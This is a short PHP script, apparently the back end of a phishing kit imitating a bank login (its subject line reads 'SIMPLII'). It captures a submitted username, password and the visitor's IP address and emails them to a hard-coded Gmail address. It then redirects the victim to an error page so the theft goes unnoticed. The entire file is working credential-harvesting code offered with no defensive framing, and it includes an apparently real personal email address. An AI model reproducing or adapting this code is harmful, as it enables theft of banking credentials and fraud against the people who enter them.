<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];
$data ="
--------------jugg--------------
Number   : $user

Password : $pass
-
IP       : $ip
--------------jugg--------------

";

$subj="SIMPLII $ip"; 

$emailusr = 'medahnabil@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: error.html");

?>
